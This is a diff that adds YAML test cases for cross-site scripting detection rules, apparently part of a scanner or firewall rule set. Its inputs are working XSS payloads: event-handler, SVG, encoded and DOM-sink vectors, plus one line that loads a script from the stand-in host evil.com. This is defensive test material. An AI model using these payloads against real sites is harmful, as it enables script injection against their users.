@@ -1,0 +1,49 @@
+- rule: new_xss_002_dom_based_xss
+  description: "Additional DOM-based XSS vectors including innerHTML, location.href, and dynamic script insertion"
+  test_cases:
+    - input: 'element.innerHTML = "<img src=x onerror=alert(1) />";'
+      expected: true
+    - input: 'window.location.href = "javascript:alert(1)";'
+      expected: true
+    - input: 'var script = document.createElement("script"); script.src = "http://evil.com/xss.js"; document.body.appendChild(script);'
+      expected: true
+
+- rule: new_xss_006_inline_event_handlers
+  description: "Additional inline event handlers coverage"
+  test_cases:
+    - input: '<img onerror="alert(1)" />'
+      expected: true
+    - input: '<form onsubmit="alert(1)">'...
+      expected: true
+    - input: '<div onmouseover="alert(1)">Hover me</div>'
+      expected: true
+
+- rule: new_xss_007_svg_element_attribute_injection
+  description: "Additional SVG event handlers and attribute-based injections"
+  test_cases:
+    - input: '<animate onbegin="alert(1)" />'
+      expected: true
+    - input: '<svg><rect onload="alert(1)" /></svg>'
+      expected: true
+
+- rule: new_xss_008_html_entity_encoded_script_injection
+  description: "Additional variations of encoded payloads and nested encodings"
+  test_cases:
+    - input: '&lt;img src=x onerror=alert(1)&gt;'
+      expected: true
+    - input: '&#x3c;script&#x3e;alert(&#x31;)&#x3c;/script&#x3e;'
+      expected: true
+    - input: '&amp;#x26;lt;script&amp;#x26;gt;alert(1)&amp;#x26;lt;/script&amp;#x26;gt;'
+      expected: true
+
+- rule: new_xss_010_dangerous_dom_methods
+  description: "Additional dangerous DOM methods coverage"
+  test_cases:
+    - input: 'document.write("<img src=x onerror=alert(1)>");'
+      expected: true
+    - input: 'eval("alert(1)");'
+      expected: true
+    - input: 'setInterval("alert(1)", 1000);'
+      expected: true
+    - input: 'new Function("alert(1)")();'
+      expected: true
